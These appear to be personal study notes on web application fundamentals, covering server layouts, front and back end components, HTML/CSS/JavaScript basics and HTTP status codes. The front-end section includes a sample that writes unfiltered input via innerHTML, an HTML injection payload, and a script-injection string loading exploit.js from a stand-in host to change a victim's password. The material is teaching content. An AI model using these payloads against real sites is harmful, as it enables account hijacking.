| **Category**                     | **Description**                                                                                                                                                                                                                                                      |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Web Application Infrastructure` | Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access. |
| `Web Application Components`     | The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: `UI/UX`, `Client`, and `Server` components.                                                    |
| `Web Application Architecture`   | Architecture comprises all the relationships between the various web application components.                                                                                                                                                                         |
## Web Application Infrastructure
- `Client-Server`
- `One Server`
- `Many Servers - One Database`
- `Many Servers - Many Databases`
#### Client-Server
- server hosts the web application in a client-server model and distributes it to any clients trying to access it.

![[Pasted image 20240607142357.png]]
#### One Server
- entire web application or even several web applications and their components, including the database, are hosted on a single server
- Easy to implement
- risky
![[Pasted image 20240607142511.png]]
#### Many Servers - One Database
- separates the database onto its own database server
- allows web app hosting server to access the db server to read,write ...
-  webserver is compromised, other webservers are not directly affected
![[Pasted image 20240607142759.png]]
#### Many Servers - Many Databases
-  within the database server, each web application's data is hosted in a separate database
- can only access private data and only common data that is shared across web applications
- if one dbserver goes down .backup is on other server
- require load balancers to function correcctly
- best for security
![[Pasted image 20240607142945.png]]


## Web Application Components
1. `Client`
2. `Server`
    - Webserver
    - Web Application Logic
    - Database
3. `Services` (Microservices)
    - 3rd Party Integrations
    - Web Application Integrations
4. `Functions` (Serverless)
## Web Application Architecture
| **Layer**            | **Description**                                                                                                                                                                                                     |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Presentation Layer` | Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS. |
| `Application Layer`  | This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.                              |
| `Data Layer`         | The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.                                                                                 |

-----



# Front End vs. Back End
## Front End
![[Pasted image 20240607143712.png]]


## Back End
|**Component**|**Description**|
|---|---|
|`Back end Servers`|The hardware and operating system that hosts all other components and are usually run on operating systems like `Linux`, `Windows`, or using `Containers`.|
|`Web Servers`|Web servers handle HTTP requests and connections. Some examples are `Apache`, `NGINX`, and `IIS`.|
|`Databases`|Databases (`DBs`) store and retrieve the web application data. Some examples of relational databases are `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, while examples of non-relational databases include `NoSQL` and `MongoDB`.|
|`Development Frameworks`|Development Frameworks are used to develop the core Web Application. Some well-known frameworks include `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS JavaScript`).|
![[Pasted image 20240607144916.png]]

jobs performed by back end components include:

- Develop the main logic and services of the back end of the web application
- Develop the main code and functionalities of the web application
- Develop and maintain the back end database
- Develop and implement libraries to be used by the web application
- Implement technical/business needs for the web application
- Implement the main [APIs](https://en.wikipedia.org/wiki/API) for front end component communications
- Integrate remote servers and cloud services into the web application



---
# HTML
```shell-session
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```



HTML elements of the above code can be viewed as follows:

![[Pasted image 20240607151445.png]]

### DOM
- The `<head>` element usually contains elements that are not directly printed on the page, like the page title, while all main page elements are located under `<body>`. 
- Other important elements include the `<style>`, which holds the page's CSS code, and the `<script>`, which holds the JS code of the page

Each of these elements is called a [DOM (Document Object Model)](https://en.wikipedia.org/wiki/Document_Object_Model).

----

# Cascading Style Sheets (CSS)
- CSS is used to define the style of each class or type of HTML elements (i.e., `body` or `h1`)

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```


## Syntax

- element { property : value; }
## Frameworks
- CSS to be difficult to develop
-  inefficient to manually set the style and design of all HTML elements in each web page.
- So CSS frameworks have been introduced, which contain a collection of CSS style-sheets and designs
---
# JavaScript
- `HTML` and `CSS` are mainly in charge of how a web page looks
- `JavaScript` iused to control any functionality that the front end web page requires
- Without `JavaScript`, a web page would be mostly static
https://jsfiddle.net/

## Usage
- `JavaScript` to drive all needed functionality on the web page 
- updating the web page view in real-time, dynamically updating content in real-time, accepting and processing user input, and many other potential functionalities.
- automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data, through technologies like [Ajax](https://en.wikipedia.org/wiki/Ajax_(programming))




---


# FRONT END COMPONENTS

###### HTML Injection
- when unfiltered user input is displayed on the page.
- by directly displaying unfiltered user input through `JavaScript` on the front end.

#### Example
```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

**PAYLOAD:**
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

---
# Cross-Site Request Forgery (CSRF)
- utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application
- allow the attacker to perform actions as the authenticated user
- gain higher privileged access to a web application
- javascript payload=>victim views the payload=>changes the victim's password=>set password by attacker

```html
"><script src=//www.example.com/exploit.js></script>
``` 
- `exploit.js` file  contain the malicious `JavaScript` code that changes the user's password
## Prevention
| Type           | Description                                                                                                 |
| -------------- | ----------------------------------------------------------------------------------------------------------- |
| `Sanitization` | Removing special characters and non-standard characters from user input before displaying it or storing it. |
| `Validation`   | Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format) |
- modern browsers have built-in anti-CSRF measures
- pervent executing js code
- including  HTTP headers and flags that  prevent automated requests (i.e., `anti-CSRF` token, or `http-only`/`X-XSS-Protection`).
---
# Back End Components

 ![[Pasted image 20240607155620.png]] 
### WEB SERVERS
- runs on the back end server
- handles all of the HTTP traffic from the client-side browser
![[Pasted image 20240607160906.png]]

| Code                        | Description                                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Successful responses**    |                                                                                                                     |
| `200 OK`                    | The request has succeeded                                                                                           |
| **Redirection messages**    |                                                                                                                     |
| `301 Moved Permanently`     | The URL of the requested resource has been changed permanently                                                      |
| `302 Found`                 | The URL of the requested resource has been changed temporarily                                                      |
| **Client error responses**  |                                                                                                                     |
| `400 Bad Request`           | The server could not understand the request due to invalid syntax                                                   |
| `401 Unauthorized`          | Unauthenticated attempt to access page                                                                              |
| `403 Forbidden`             | The client does not have access rights to the content                                                               |
| `404 Not Found`             | The server can not find the requested resource                                                                      |
| `405 Method Not Allowed`    | The request method is known by the server but has been disabled and cannot be used                                  |
| `408 Request Timeout`       | This response is sent on an idle connection by some servers, even without any previous request by the client        |
| **Server error responses**  |                                                                                                                     |
| `500 Internal Server Error` | The server has encountered a situation it doesn't know how to handle                                                |
| `502 Bad Gateway`           | The server, while working as a gateway to get a response needed to handle the request, received an invalid response |
| `504 Gateway Timeout`       | The server is acting as a gateway and cannot get a response in time                                                 |
 
 
 
 #### CVE FINDER

   [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/),  [Vulnerability Lab](https://www.vulnerability-lab.com/)

